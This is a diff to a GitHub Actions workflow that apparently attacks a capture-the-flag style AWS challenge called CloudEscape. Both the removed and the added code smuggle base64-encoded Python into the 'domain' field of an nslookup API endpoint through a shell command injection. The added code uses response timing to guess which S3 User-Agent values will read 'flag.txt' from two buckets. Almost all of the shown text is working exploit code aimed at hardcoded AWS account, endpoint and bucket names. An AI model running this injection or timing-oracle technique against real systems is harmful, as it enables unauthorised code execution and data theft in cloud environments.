@@ -19,7 +19,7 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Test Lambda execution and policy access
+      - name: Test S3 User-Agent conditions through timing oracle
         env:
           CLOUDESCAPE_PUBLIC_KEY: |
             -----BEGIN PUBLIC KEY-----
@@ -39,18 +39,24 @@ jobs:
           import base64, json, os, requests, time
           from requests_aws4auth import AWS4Auth
           auth = AWS4Auth(os.environ["AWS_ACCESS_KEY_ID"], os.environ["AWS_SECRET_ACCESS_KEY"], "us-east-1", "execute-api", session_token=os.environ["AWS_SESSION_TOKEN"])
-          tests = {
-              "python_control": "import time; time.sleep(5)",
-              "user_bucket_policy": "import boto3,time; s=boto3.client('s3',region_name='us-east-1',endpoint_url='https://s3.us-east-1.amazonaws.com'); s.get_bucket_policy(Bucket='userad88e2b168aa387e'); time.sleep(5)",
-              "log_bucket_policy": "import boto3,time; s=boto3.client('s3',region_name='us-east-1',endpoint_url='https://s3.us-east-1.amazonaws.com'); s.get_bucket_policy(Bucket='logad88e2b168aa387e'); time.sleep(5)"
-          }
+          uas = ["cloudescape","CloudEscape","CloudEscapeLambda","CloudEscape/1.0","nslookupv2","nslookup","lambda","AWSLambda","aws-lambda","boto3","aws-sdk-python","aws-cli","Mozilla/5.0","curl","python-requests","stage2","CloudEscape-Stage2"]
           results = {}
-          for name, code in tests.items():
-              encoded = base64.b64encode(code.encode()).decode()
-              domain = 'example.com; python3 -c "import base64;exec(base64.b64decode(\'' + encoded + '\'))"'
-              start = time.monotonic()
-              r = requests.post("https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup", json={"domain":domain}, auth=auth, timeout=30)
-              results[name] = {"status":r.status_code,"elapsed":round(time.monotonic()-start,3)}
+          for bucket in ["userad88e2b168aa387e", "logad88e2b168aa387e"]:
+              for ua in uas:
+                  code = f"""import boto3, time
+          try:
+              from botocore.config import Config
+              s = boto3.client('s3', region_name='us-east-1', endpoint_url='https://s3.us-east-1.amazonaws.com', config=Config(user_agent_extra={ua!r}))
+              s.get_object(Bucket={bucket!r}, Key='flag.txt')['Body'].read()
+              time.sleep(4)
+          except Exception:
+              pass
+          """
+                  encoded = base64.b64encode(code.encode()).decode()
+                  domain = 'example.com; python3 -c "import base64;exec(base64.b64decode(\'' + encoded + '\'))"'
+                  start = time.monotonic()
+                  r = requests.post("https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup", json={"domain":domain}, auth=auth, timeout=30)
+                  results[f"{bucket}:{ua}"] = {"status":r.status_code,"elapsed":round(time.monotonic()-start,3)}
           json.dump(results,open("/tmp/cloudescape-result.json","w"),separators=(",",":"))
           PY
           openssl rand -hex 32 > /tmp/cloudescape.key
